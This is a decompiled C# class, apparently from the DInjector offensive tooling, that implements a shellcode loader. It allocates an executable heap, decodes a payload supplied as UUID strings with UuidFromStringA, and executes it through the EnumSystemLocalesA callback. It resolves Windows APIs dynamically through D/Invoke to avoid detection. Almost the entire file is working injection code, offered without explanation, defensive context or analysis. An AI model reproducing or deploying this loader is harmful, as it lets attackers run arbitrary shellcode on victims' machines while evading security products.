using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x0200000A RID: 10
	internal class CurrentThreadUuid
	{
		// Token: 0x06000024 RID: 36 RVA: 0x00003784 File Offset: 0x00001984
		public static IntPtr heapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize)
		{
			object[] array = new object[]
			{
				flOptions,
				dwInitialSize,
				dwMaximumSize
			};
			return (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "HeapCreate", typeof(CurrentThreadUuid.HeapCreate), ref array, false, true);
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000037D8 File Offset: 0x000019D8
		public static IntPtr uuidFromStringA(string stringUuid, IntPtr heapPointer)
		{
			object[] array = new object[]
			{
				stringUuid,
				heapPointer
			};
			return (IntPtr)Generic.DynamicAPIInvoke("rpcrt4.dll", "UuidFromStringA", typeof(CurrentThreadUuid.UuidFromStringA), ref array, false, true);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x0000381C File Offset: 0x00001A1C
		public static bool enumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags)
		{
			object[] array = new object[]
			{
				lpLocaleEnumProc,
				dwFlags
			};
			return (bool)Generic.DynamicAPIInvoke("kernel32.dll", "EnumSystemLocalesA", typeof(CurrentThreadUuid.EnumSystemLocalesA), ref array, false, true);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003864 File Offset: 0x00001A64
		public static void Execute(string shellcodeUuids)
		{
			IntPtr intPtr = CurrentThreadUuid.heapCreate(262144U, UIntPtr.Zero, UIntPtr.Zero);
			Console.WriteLine("(CurrentThreadUuid) [+] HeapCreate");
			string[] array = shellcodeUuids.Split(new char[]
			{
				'|'
			});
			IntPtr heapPointer = IntPtr.Zero;
			for (int i = 0; i < array.Length; i++)
			{
				heapPointer = IntPtr.Add(intPtr, 16 * i);
				CurrentThreadUuid.uuidFromStringA(array[i], heapPointer);
			}
			Console.WriteLine("(CurrentThreadUuid) [+] UuidFromStringA");
			if (CurrentThreadUuid.enumSystemLocalesA(intPtr, 0))
			{
				Console.WriteLine("(CurrentThreadUuid) [+] EnumSystemLocalesA");
				return;
			}
			Console.WriteLine("(CurrentThreadUuid) [-] EnumSystemLocalesA:");
		}

		// Token: 0x02000036 RID: 54
		// (Invoke) Token: 0x0600006A RID: 106
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

		// Token: 0x02000037 RID: 55
		// (Invoke) Token: 0x0600006E RID: 110
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr UuidFromStringA(string stringUuid, IntPtr heapPointer);

		// Token: 0x02000038 RID: 56
		// (Invoke) Token: 0x06000072 RID: 114
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
	}
}
